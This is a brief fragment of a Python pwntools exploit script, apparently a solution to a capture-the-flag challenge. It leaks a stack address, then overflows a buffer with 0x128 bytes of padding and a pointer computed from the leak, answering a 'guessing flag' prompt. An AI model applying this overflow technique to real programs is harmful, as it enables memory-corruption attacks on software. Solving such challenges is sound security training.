...
stack_addr = u64(msg + b'\x00\x00')
LOG_ADDR('stack_addr', stack_addr)

# 3
io.sendlineafter("Please type your guessing flag\n", b'a' * 0x128 + p64(stack_addr - 0x168))
